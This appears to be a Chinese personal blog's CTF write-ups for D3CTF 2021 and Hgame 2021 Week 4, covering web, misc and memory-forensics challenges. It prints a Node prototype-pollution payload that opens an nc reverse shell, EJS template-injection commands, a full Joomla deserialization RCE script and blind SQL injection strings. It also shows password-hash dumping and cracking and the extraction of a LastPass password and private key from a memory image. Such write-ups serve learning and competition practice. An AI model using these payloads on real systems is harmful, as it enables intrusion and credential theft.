#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void main() { seteuid(0); setegid(0); setuid(0); setgid(0); system(\"/bin/cat /flag\"); } 看了官方 WP，发现确实有一种污染环境变量的方法。 https://blog.p6.is/Abusing-Environment-Variables/ {\"constructor.prototype.env\": {\"NODE_DEBUG\": \"require('child_process').execSync('nc ip port -e/bin/sh')//\",\"NODE_OPTIONS\": \"-r /proc/self/environ\" },\"constructor.prototype.sendmail\": true,\"constructor.prototype.shell\": \"/bin/node\"} 小结misc 其他题目的话，比如： 量子密钥分发（quantum key distribution，QKD），用的应该是 BB84 协议。 不过流量包提取不出来，赛后才发现确实就是 Python 序列化后的，可以导出 JSON 再提取 data 再反序列化 网上找到的几个 Google Capture The Flag 2019 (Quals) 的 Writeup： https://github.com/shahar603/CTF-Writeups/blob/master/2019/Google%20CTF%202019%20Quals/Quantum_Key_Distribution.md https://sasdf.github.io/ctf/writeup/2019/google/crypto/qkd/ https://ctftime.org/writeup/15844 https://ctftime.org/writeup/18212 看了官方 wp，好家伙，python 有个 pyshark 包能直接提取啊…… 还有个 Robust 每日网易云 keep doctors away 的，给的是 QUIC / HTTP3 的流量包，看上去像是 m3u8 推流的抓包。 和喵喵春节闯关 Task2 的推流有点像，抓了个包发现也类似。 先加载 SSLKEYLOGFILE 得到明文流量，但是不会提取 QUIC，太草了 可以导出 JSON 然后写个脚本提取的，呜呜呜，我是fw（（（ 看了官方 wp，草，这题这么套娃的么。（ 流量解密完是加密的 m3u8 流，提取出密钥用 aes-128-cbc 解密，根据频谱发现是拨号上网的调制解调器（modem），解码完得到 base64 解密得到压缩包。再去网易云找到相同歌曲的歌词 json 进行明文攻击。得到的 txt 文档内容空白字符隐写，再 base85 解密得到 flag。 BTW，还找了点 QUIC 相关的工具。 a listing of tools for analysing, debugging and visualising QUIC (and potentially the HTTP mapping). See also the Implementations listing. qvis —— Toolsuite for visualizing QUIC+HTTP/3 qlog and pcap files. Includes a sequence diagram, congestion graph, multiplexing diagram and packetization visualization. 一个 QUIC+HTTP/3 可视化的工具。（GitHub） 有一题 shellgen2 是输入 Python 代码，输出 PHP。验证逻辑是随机产生一段字符串，执行 Python 代码得到 PHP 代码，然后经过 waf 之后再执行 PHP。貌似个限制长度的 无字母数字 webshell。 （喵喵迷茫 BTW，revshellgenStandalone script written in Python 3 for generating reverse shells easily without typing. It automates the boring stuff like URL encoding the command and setting up a listener.一个自动生成多种语言的反弹 shell 的工具，还能同时打开端口监听。 etc. 被卡住太难受了，之后有空有机会再来复现吧。 Pwn 有题 QEMU 逃逸的，喵喵从 misc 的角度来看的。 题目在 docker 里搭了个 QEMU 虚拟机。flag 在 docker 里的（相对于虚拟机的） host 里，连接发现通过 Ctrl-A C 可以退出虚拟机到 monitor，把 flag 作为光驱挂载上去，但 Ctrl-A C 再进去发现读不出来，看别人 wp 发现需要往这个里面先写入其他字符串，足够长才能输出。然而有点问题这么打没打通，最后队友用 binary 的方法打通了，233333. 太顶了太顶了！ 喵呜呜呜呜呜，我只会签到、问卷和这道来来回回的虚拟机了…… 挤不进前20了，喵喵大哭。 不过拿了个一血还是挺爽的！ 不对劲，本来说着随意写写的，怎么扯了这么多（ （溜了溜了 噢，Official Writeup 终于出来了！ https://github.com/D-3CTF/D3CTF-2021-Official-Writeup","path":"2021/03/09/CTF_2021Ant-D3CTF/"},{"title":"CTF | 2021 Hgame Week4 WriteUp","text":"引言Hgame 2021 Week 4 喵呜，转眼间 Hgame 就到了最后一周，寒假也结束了。 这周题目好难啊，还有就收假了比较忙，后面就没时间看题了。 问题不大（喵喵爬走 Web漫无止境的星期日 在我长大的这个城市里，每个人都有超越寻常的特长。我可以重启这个世界（是的整个世界），不仅仅是将时钟往回拨，而是将世界的一切，从原子层面恢复到一天前的状态。只有看到有人在哭泣时，我才会重启。包括我的记忆，全部重启。但是，不用担心，我的搭档有绝对记忆。 然而，我们被困在了这一天里，漫无止境的星期日。有情报说，只要我们重启了这一天，“MacGuffin” 便会出现在我们面前，并且它会满足我们的任何愿望。 http://macguffin.0727.site:5000/ 提示有源码。 下载下来一看，啊 NodeJS，好耶！ app.js const express = require('express') const bodyParser = require('body-parser') const session = require('express-session') const randomize = require('randomatic') const ejs = require('ejs'); const path = require(\"path\"); const app = express() app.use(bodyParser.urlencoded({ extended: true })).use(bodyParser.json()) app.use('/static', express.static('static')) app.use(session({ name: 'session', secret: randomize('aA0', 16), resave: false, saveUninitialized: false })) app.set('views', './views') app.set('view engine', 'ejs') app.all('/', (req, res) =&gt; { let data = { name: \"\", discription: \"\" } if (req.ip === \"::ffff:127.0.0.1\") { data.crying = true } if (req.method == 'POST') { Object.keys(req.body).forEach((key) =&gt; { if (key !== \"crying\") { data[key] = req.body[key] } }) req.session.crying = data.crying req.session.name = data.name req.session.discription = data.discription return res.redirect(302, '/show'); } return res.render('loop') }) app.all('/show', (req, res) =&gt; { if (!req.session.name || !req.session.discription) { return res.redirect(302, '/'); } let wishes = req.session.wishes ? req.session.wishes : \"\" return res.render('show', { name: req.session.name, discription: req.session.discription, wishes: wishes }) }) app.all('/wish', (req, res) =&gt; { if (!req.session.crying) { return res.send(\"forbidden.\") } if (req.method == 'POST') { let wishes = req.body.wishes req.session.wishes = ejs.render(`&lt;div class=\"wishes\"&gt;${wishes}&lt;/div&gt;`) return res.redirect(302, '/show'); } return res.render('wish'); }) app.listen(3000, () =&gt; console.log(`App start on port 3000!`)) show.ejs &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"static/css/bootstrap.min.css\"&gt; &lt;link rel=\"stylesheet\" href=\"static/css/show.css\"&gt; &lt;title&gt;SHOW&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"main-box\" translate=\"no\"&gt; &lt;div class=\"content-card\"&gt; &lt;ol class=\"articles\"&gt; &lt;li class=\"articles__article\" style=\"--animation-order:1\"&gt; &lt;a class=\"articles__link\"&gt; &lt;div class=\"articles__content articles__content--lhs\"&gt; &lt;h2 class=\"articles__title\"&gt; &lt;%= discription %&gt; &lt;/h2&gt; &lt;div class=\"articles__footer\"&gt; &lt;p&gt; &lt;%= name %&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"articles__content articles__content--rhs\" aria-hidden=\"true\"&gt; &lt;h2 class=\"articles__title\"&gt; &lt;%= discription %&gt; &lt;/h2&gt; &lt;div class=\"articles__footer\"&gt; &lt;p&gt; &lt;%= name %&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;/li&gt; &lt;/ol&gt; &lt;% if (wishes) { %&gt; &lt;%- wishes %&gt; &lt;% } %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;script src=\"static/js/jquery.min.js\"&gt;&lt;/script&gt; 注意到处理 / 路由的时候，把 body 里除了 crying 的东西都赋值给 data 了，于是想到是 原型链污染 。 回显的话可以通过这个 wishes 来进行。 随意发个包，可以发现用的是 application/x-www-form-urlencoded 传参。 但是为了构造原型链污染，我们需要用 object，很好它在第 9 行这里用了 json，那我们就可以改一下 content-type 污染了。 payload: {\"name\":\"meow\", \"discription\": \"MiaoTony\", \"__proto__\": {\"crying\": true}} 然后访问 /wish 就能发现正常访问而没被拦了。 在这里就是 ejs 模板注入 啦。 参考 之前 NCTF 2020 的 payload. 嗯是个通用的 payload。 &lt;%- global.process.mainModule.require('child_process').execSync('ls -al /') %&gt; 打过去，先看看根目录有啥。 很好，看到 flag 了。 再走一遍流程读 flag。 &lt;%- global.process.mainModule.require('child_process').execSync('cat /flag') %&gt; hgame{nOdeJs_Prot0type_ls_fUnny&amp;Ejs_Templ@te_Injection} joomlaJoomla!!!!! 这是一个简单的题目描述。附件：http://1.oss.hgame2021.vidar.club/joomlaJoomla.zip http://9bf30fbbcb.joomla.r4u.top:6788/ 啊 2015 年巨古老的框架了。 一搜就发现有 Session 反序列化漏洞。 通过Joomla的两次RCE漏洞看session反序列化 session反序列化代码执行漏洞分析[Joomla RCE] BTW, PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患 或者 用 searchsploit 搜一下也能发现。 就是 Joomla 自己实现了一种 session 序列化的格式，通过 XFF 或者 User-Agent 可以注入到数据库。 然而用现成的 exp 直接打过去发现打不通。 看文件修改日期就能发现改了代码。 根据 Joomla远程代码执行漏洞分析（总结） 对比发现增加了一部分代码。 可以发现把第一个出现的 | 给替换为空了。 那我们在 exp 最开始加个 |，或者双写 | 就完事了！ 然后生成 payload，拿 flag。 Python 2 ''' Simple PoC for Joomla Object Injection. Gary @ Sec-1 ltd http://www.sec-1.com/ ''' import requests # easy_install requests def get_url(url, user_agent): headers = { 'User-Agent': user_agent } cookies = requests.get(url,headers=headers).cookies for _ in range(3): response = requests.get(url, headers=headers,cookies=cookies) return response def php_str_noquotes(data): \"Convert string to chr(xx).chr(xx) for use in php\" encoded = \"\" for char in data: encoded += \"chr({0}).\".format(ord(char)) return encoded[:-1] def generate_payload(php_payload): php_payload = \"eval({0})\".format(php_str_noquotes(php_payload)) terminate = '\\xf0\\xfd\\xfd\\xfd' exploit_template = r'''|}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";''' injected_payload = \"{};JFactory::getConfig();exit\".format(php_payload) exploit_template += r'''s:{0}:\"{1}\"'''.format(str(len(injected_payload)), injected_payload) exploit_template += r''';s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}''' + terminate return exploit_template pl = generate_payload(\"system('cat /flag');\") # phpinfo(); print get_url(\"http://9bf30fbbcb.joomla.r4u.top:6788/\", pl).content hgame{WelCoME~TO-ThIs_Re4Lw0RLD} Unforgettable Liki 更新了她的 TodoList, 终于记住了很多不能忘记的事情PS: flag 内容中的字母都为小写，请自行用 hgame{} 包裹得到的 flag https://unforgettable.liki.link/ 这题很坑，不想上周那样存在 Flask SSTI. 试了很久，突然发现相比上周多了一个 user 页面，发现这个页面上的 username 存在 SQL 注入。 而其他页面的右上角 username 都是正常显示的（用户名原本的模样）。 这个写起来就很麻烦，需要注册用户，然后登录，访问 /user. 试了一下 username 过滤的还挺多……包括但不限于 空格 = like and or 之类的。 还有一定情况注册成功了但访问 /user 并没有回显，反而就是个 username。 后来才知道这是 SQL 二次注入。 二次注入是指已存储(数据库、文件)的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 这题中就是 在 user 页面有个 SQL 语句，访问的时候才执行查询，但就能注入了。 瞎试了试发现还把别人的用户名给整出来了。2333 啊发现有现成的 payload 了。好耶！ SeleCt'+'1+2 1HinrG'/**/&amp;&amp;/**/(IF(right(left((SELECT/**/GROUP_CONCAT(ffllllaaaagg)/**/FROM/**/ffflllaagggg),1),1)/**/IN/**/('''),BENCHMARK(55555555,MD5('a')),0))# SeleCt'+'5 5dPaU6'/**/&amp;&amp;/**/(IF(LENGTH((SELECT/**/ffllllaaaagg/**/FROM/**/ffflllaagggg))/**/IN/**/(2),BENCHMARK(55555555,MD5('a')),0))# 其实就盲注，布尔/时间盲注都行。 要注册登录挺麻烦的就是了。 （不过后来寒假么得了 没空写脚本了 emmm MiscAkira之瞳-1 有人想问 Akira 为什么总喜欢用眼睛当头像，Akira 说：“我给你讲个故事吧，从前有一天一位原画师在上班，不幸的是突然起了火灾，情急之下 IT 部门把她没保存的工作 dump 了下来并传到了网上 …… ” https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z 内存取证 1GiB 的内存镜像啊，好大（ $ volatility -f important_work.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (E:\\CTF\\test\\Hgame2021\\week4\\Misc_Akira-1\\important_work.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf8000403b0a0L Number of Processors : 16 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff8000403cd00L KPCR for CPU 1 : 0xfffff88004700000L KPCR for CPU 2 : 0xfffff88004776000L KPCR for CPU 3 : 0xfffff880047ec000L KPCR for CPU 4 : 0xfffff88004840000L KPCR for CPU 5 : 0xfffff880048b6000L KPCR for CPU 6 : 0xfffff8800492c000L KPCR for CPU 7 : 0xfffff880049a2000L KPCR for CPU 8 : 0xfffff880049d8000L KPCR for CPU 9 : 0xfffff88004a94000L KPCR for CPU 10 : 0xfffff88004b0a000L KPCR for CPU 11 : 0xfffff88004b80000L KPCR for CPU 12 : 0xfffff88004c00000L KPCR for CPU 13 : 0xfffff88004c76000L KPCR for CPU 14 : 0xfffff88004cec000L KPCR for CPU 15 : 0xfffff88004d62000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2021-02-18 09:47:25 UTC+0000 Image local date and time : 2021-02-18 17:47:25 +0800 Win7SP1x64 看看桌面上有啥文件。 $ volatility -f important_work.raw --profile=Win7SP1x64 filescan | grep Desktop Volatility Foundation Volatility Framework 2.6 0x000000001ed735f0 5 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000003ec31eb0 10 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000003ec5c070 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\HGAME2021-20210218-094722.raw 0x000000003ec703d0 18 2 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip 0x000000003ed28eb0 10 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000003ed53070 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\HGAME2021-20210218-094722.raw 0x000000003ed673d0 18 2 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip 0x000000003f277bb0 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\desktop.ini 0x000000003f278a40 2 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop\\desktop.ini 0x000000003f27a8c0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003f27aa90 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003f287dd0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f288c40 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f28edd0 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003f28f440 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003f2906d0 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003f293070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003f294600 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Games\\Desktop.ini 0x000000003f294a60 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003f296ac0 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003f297370 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003f297f20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003f299c10 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Tablet PC\\Desktop.ini 0x000000003f2e1a40 6 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe 0x000000003f2fa710 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f30b480 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f4ca830 16 0 R--r-- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe 0x000000003f8e2dd0 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 然后提取一下看上去关键的。 $ volatility -f important_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003f4ca830 --dump-dir=./ -u Volatility Foundation Volatility Framework 2.6 ImageSectionObject 0x3f4ca830 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe DataSectionObject 0x3f4ca830 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe $ volatility -f important_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003ec703d0 --dump-dir=./ -u Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3ec703d0 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip SharedCacheMap 0x3ec703d0 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip 压缩包注释提示密码是 sha256(login_password) 于是去内存里找密码。 先看看内存。 $ volatility -f important_work.raw --profile=Win7SP1x64 hivelist Volatility Foundation Volatility Framework 2.6 Virtual Physical Name ------------------ ------------------ ---- 0xfffff8a001862010 0x000000003243d010 \\??\\C:\\System Volume Information\\Syscache.hve 0xfffff8a00000f010 0x000000000f972010 [no name] 0xfffff8a000024010 0x000000001b87d010 \\REGISTRY\\MACHINE\\SYSTEM 0xfffff8a000053150 0x000000000fcad150 \\REGISTRY\\MACHINE\\HARDWARE 0xfffff8a0003b0010 0x000000000c21a010 \\SystemRoot\\System32\\Config\\DEFAULT 0xfffff8a000746010 0x0000000011518010 \\SystemRoot\\System32\\Config\\SOFTWARE 0xfffff8a00074e410 0x0000000011b0d410 \\Device\\HarddiskVolume1\\Boot\\BCD 0xfffff8a000b1b010 0x000000003c38f010 \\SystemRoot\\System32\\Config\\SECURITY 0xfffff8a000bc3410 0x000000003cd3c410 \\SystemRoot\\System32\\Config\\SAM 0xfffff8a000c06010 0x000000003bb46010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT 0xfffff8a000c8f410 0x000000003bc42410 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT 0xfffff8a00131e010 0x00000000067e6010 \\??\\C:\\Users\\Genga03\\ntuser.dat 0xfffff8a0013b0010 0x000000001b4bc010 \\??\\C:\\Users\\Genga03\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat 然后提取密码。 # volatility -f name --profile=Win7SP1x64 hashdump -y 注册表 system 的 virtual 地址 -s SAM 的 virtual 地址 $ volatility -f important_work.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000bc3410 Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Genga03:1001:aad3b435b51404eeaad3b435b51404ee:84b0d9c9f830238933e7131d60ac6436::: $ volatility -f important_work.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000bc3410 &gt; pass.txt $ john pass.txt --format=NT 用 john 破解得到密码为 asdqwe123 $ echo -n asdqwe123 &gt; test $ sha256sum test 20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3 test 解压得到两张图片，噢 盲水印 啊。 用 GitHub 上的 BlindWaterMark 来提取盲水印。 $ python bwmforpy3.py decode src.png Blind.png output.png 提取出来的有点朦胧，稍微调一下对比度。 hgame{7he_f1ame_brin9s_me_end1ess_9rief} 好耶！蹭这个机会终于学了学 volatility 的使用（（ Akira之瞳-2 ……“最后呢？”“最后她还是没能幸免，人们在保险箱旁发现了她烧焦的尸体，打开保险箱人们发现了一个U盘，是她将回家画好的原稿带来时用的 ……” https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z （怎么这个镜像还要大啊，2GiB… 照样看镜像信息。 $ volatility -f secret_work.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/mnt/hgfs/ctf/Hgame2021/week4/Misc_Akira-2/secret_work.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80003ff7120L Number of Processors : 16 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80003ff9000L KPCR for CPU 1 : 0xfffff88004500000L KPCR for CPU 2 : 0xfffff8800457d000L KPCR for CPU 3 : 0xfffff880009b9000L KPCR for CPU 4 : 0xfffff88004654000L KPCR for CPU 5 : 0xfffff880046d1000L KPCR for CPU 6 : 0xfffff8800474e000L KPCR for CPU 7 : 0xfffff880047cb000L KPCR for CPU 8 : 0xfffff88004848000L KPCR for CPU 9 : 0xfffff880048c5000L KPCR for CPU 10 : 0xfffff88004942000L KPCR for CPU 11 : 0xfffff880049bf000L KPCR for CPU 12 : 0xfffff88004a40000L KPCR for CPU 13 : 0xfffff88004abd000L KPCR for CPU 14 : 0xfffff88004b3a000L KPCR for CPU 15 : 0xfffff88004bb7000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2021-02-19 08:23:04 UTC+0000 Image local date and time : 2021-02-19 16:23:04 +0800 读取并提取文件 $ volatility -f secret_work.raw --profile=Win7SP1x64 filescan | grep Desktop Volatility Foundation Volatility Framework 2.6 0x000000003ef28430 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\HGAME2021-20210219-082257.raw 0x000000003f260a80 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000007ec7a070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\desktop.ini 0x000000007ec7d070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop\\desktop.ini 0x000000007ec9af20 12 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000007ec9ba70 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000007ec9c370 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000007ec9d070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000007ec9e8c0 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000007eca1820 2 0 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\Google Chrome.lnk 0x000000007eca1970 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000007eca1c80 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000007eca4f20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Games\\Desktop.ini 0x000000007eca5970 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000007eca6070 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000007ecb7e20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Tablet PC\\Desktop.ini 0x000000007ed64800 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000007ed70340 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000007ed715a0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000007ef94820 2 0 RW-r-- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\dumpme.txt 0x000000007f416f20 10 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000007f418a30 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000007f7d08f0 2 0 R--rw- \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Remote Desktop Connection.lnk 0x000000007fc28dd0 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop $ volatility -f secret_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ef94820 --dump-dir=./ -u dumpme.txt zip password is: 5trqES&amp;P43#y&amp;1TO And you may need LastPass 解压 secret.7z 得到 S- 开头的那玩意怎么看都像是回收站（ 用 LastPass 得到登录密码。 https://github.com/kevthehermit/volatility_plugins/tree/master/lastpass git clone 下来，然后用 --plugins= 指定路径。 $ volatility --plugins=/home/miaotony/CTF/Tools/volatility_plugins/lastpass -f secret_work.raw --profile=Win7SP1x64 lastpass Volatility Foundation Volatility Framework 2.6 Searching for LastPass Signatures Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found LastPass Entry for live.com UserName: windows login &amp; miscrosoft Pasword: Unknown Found LastPass Entry for live.com,bing.com,hotmail.com,live.com,microsoft.com,msn.com,windows.com,windowsazure.com,office.com,skype.com,azure.com UserName: windows login &amp; miscrosoft Pasword: vIg*q3x6GFa5aFBA Found Private Key LastPassPrivateKey&lt;308204BB020100300D06092A864886F70D0101010500048204A5308204A10201000282010100BF794F57D296731F67FD1007BEB13A7732DE75CEB688A0A0B8A4C9DE5D0757E83F9CE8EED14346977C72C65F2C2834F150D9FB54086531896CDEFD6D8F4A5CCA2D39E0ADCB24AA6EE075579E9C6631588E9474F6B91B9D1D4D23E55442FA4E89D6810A764CCCEB224DB045DE8E9B17D3A0E561F96D4F414E775A76EA74031AB0EDAB640D1D5FFB8B83F7F7F0CA2D415F9E68CB9DB1AB6028012724AE5674FCC5C0C6085FD2A5C39E785E36C899166120893095779104A123090681914834E063FD433E0F54A221BFA6B344F76B270D1FB5FBC5A7385911A0222A65FD7FDA3573F1A9C8C8B75003664DC998FB6BAB048D65F0A44A23E1446E299A4323280A13ED020111028201000B435F052A815210E7FFD3C43864C734302B341B37E9EB54BF91390D1487F61CB872A44A488B7C9F7FCA8423B74DA8C2E6A369230F8D7B626FD0E1BB268BE7572FD63A64937AA09D1C43234590BAB79BCC26D9B429019FD48C112B9B8B7822BCD061F18E7CFCFEC5C855A9C1CC273DA30976E7A542AA4F22BBBA06FEBB87B6468A44BD7E57DA570AB63E1A013AD75AC3B6B3927D274769E4774B7DC66DC10CA337465A39221C062B9B96BF4E8BF484C3F171A40E41B6D32FC417E0A54EFEE8896346947F7CB40B382F2D8AB78D6CD040570FAC76C0497CC3A677B884B6208157E482D42B0CD675C7F52F50AAA221C076F2604475B4A3F766B9B0103DA11633ED02818100FE8270E2DD0E11837ECDE3E61EED958F59F0FC906A46082A9C38ED503968174F233CC4A7E95F1DF125CEDAAF56A374B986883CFD803FCE883378DCBB43EBDBB631E6069D3151572368206134BB850E3B47638C8E5CB4F4A742D30D87876BB76ACEEA9A0EEB6BB5301A5E730C976F660693BA37E9A73F66140F3EE3E6058687B702818100C0985DC66AD22251EB0A59F5C2F2A4D1228B14BDABA74FD178EADD30D33B0E9FF1DD45ECA56A3CC7FD8C